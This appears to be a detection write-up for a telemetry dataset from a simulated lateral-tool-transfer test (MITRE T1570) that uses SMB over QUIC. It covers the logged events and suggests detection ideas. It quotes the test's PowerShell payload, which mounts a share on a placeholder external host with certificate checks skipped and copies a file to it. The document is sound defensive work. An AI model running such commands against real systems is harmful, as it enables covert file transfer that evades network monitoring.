# T1570-1: Lateral Tool Transfer — New-SmbMapping

## Technique Context

T1570 (Lateral Tool Transfer) covers adversary movement of tools or files between
systems in a network. This test simulates a modern evasion technique: using SMB over
QUIC (RFC 9000) to mount a remote share and copy files. SMB over QUIC tunnels the
SMB protocol over UDP port 443, making it appear as HTTPS traffic to network monitoring
tools. This capability was introduced in Windows Server 2022 and Windows 11. The test
uses the PowerShell `New-SmbMapping` cmdlet with `-TransportType QUIC` and
`-SkipCertificateCheck` to mount `\\example.com\sales` and attempts to copy
`C:\path\to\file.txt` to the mapped drive.

## What This Dataset Contains

**Sysmon EID 3** — outbound network connection from `MpDefenderCoreService.exe`:

> `DestinationIp: 52.123.249.35`
> `DestinationPort: 443`
> `Protocol: tcp`

This is a Defender cloud lookup triggered by the SMB over QUIC attempt — not the QUIC
connection itself. The test's actual QUIC connection to `example.com:443` was not
captured as a separate Sysmon EID 3 event, likely because the attempt failed before
a connection was established or because QUIC (UDP) was not recorded by Sysmon's network
filter on this host.

**Sysmon EID 22** — DNS query from `svchost.exe`:

> `QueryName: example.com`
> `QueryStatus: 0`
> `QueryResults: ::ffff:104.18.27.120;::ffff:104.18.26.120;`

Name resolution for the target share server was attempted and succeeded (Cloudflare
CDN IPs), confirming the connectivity phase executed before the QUIC transport failed.

**WMI EID 5858** — WMI operation failure:

> `Operation = Start IWbemServices::ExecMethod - ROOT\Microsoft\Windows\SMB : MSFT_SmbMapping::Create`
> `ResultCode = 0x80041001`

`0x80041001` is `WBEM_E_FAILED` (generic WMI provider failure). The SMB cmdlet uses
WMI internally; this error confirms the `New-SmbMapping` call failed. The QUIC transport
is not available or configured on this host (ACME-WS02 is a domain workstation, not a
QUIC-capable file server).

**Security EID 4688/4689** — process lifecycle events for `powershell.exe` and
`whoami.exe` under SYSTEM.

**Security EID 4703** — token right adjustment.

**PowerShell EID 4104** — script block logging captures the test payload clearly:

> `{New-SmbMapping -RemotePath '\\example.com\sales' -TransportType QUIC -SkipCertificateCheck`
> `copy 'C:\path\to\file.txt' 'Z:\'}`

Also captures the SMB localization PSD1 module load and standard test framework boilerplate.

**PowerShell EID 4102** — module logging recording the SmbShare module import.

## What This Dataset Does Not Contain (and Why)

**No successful QUIC connection.** SMB over QUIC requires server-side configuration on
Windows Server 2022 with a TLS certificate. `example.com` is a placeholder domain that
does not expose an SMB over QUIC endpoint. The WMI 5858 error confirms the attempt
failed at the provider level.

**No Sysmon EID 1 for PowerShell.** The sysmon-modular include-mode ProcessCreate
filter did not match `powershell.exe` for this invocation — the command line lacked a
LOLBin or specific suspicious pattern in the matched rules. Security EID 4688 provides
full command line coverage.

**No file copy telemetry.** Because the share mount failed, the `copy` command in the
test payload never executed; no file operation events appear.

**No UDP/QUIC Sysmon EID 3.** Sysmon's network connection logging is typically limited
to TCP. UDP connections, including QUIC, are not captured by Sysmon EID 3.

## Assessment

This dataset demonstrates the challenge of detecting SMB over QUIC: the technique is
designed to blend with HTTPS traffic. Even in this failed execution, the detection
footprint is limited to a DNS query to the target domain, a Defender cloud check, and
a WMI provider error. In a successful scenario on a properly configured QUIC server,
the primary detection surface would be the DNS query and the PowerShell command line
— the QUIC traffic itself would appear as port-443 TCP/UDP to network sensors.

## Detection Opportunities Present in This Data

- **PowerShell EID 4104** — `-TransportType QUIC` and `-SkipCertificateCheck` arguments
  to `New-SmbMapping` are high-fidelity indicators; `-SkipCertificateCheck` in particular
  indicates intentional certificate bypass.
- **Security EID 4688** — PowerShell command line with `New-SmbMapping` and QUIC
  transport; detectable even if no connection succeeds.
- **WMI EID 5858** — `MSFT_SmbMapping::Create` failures can indicate SMB mapping
  attempts including QUIC transport, useful for tracking unsuccessful lateral movement
  preparation.
- **Sysmon EID 22** — DNS queries to non-internal hostnames from SYSTEM-context
  processes for fileshare-style targets may indicate lateral movement reconnaissance.
- **Sysmon EID 3** — Defender network lookup triggered by the attempt provides a
  secondary timestamp correlation point.
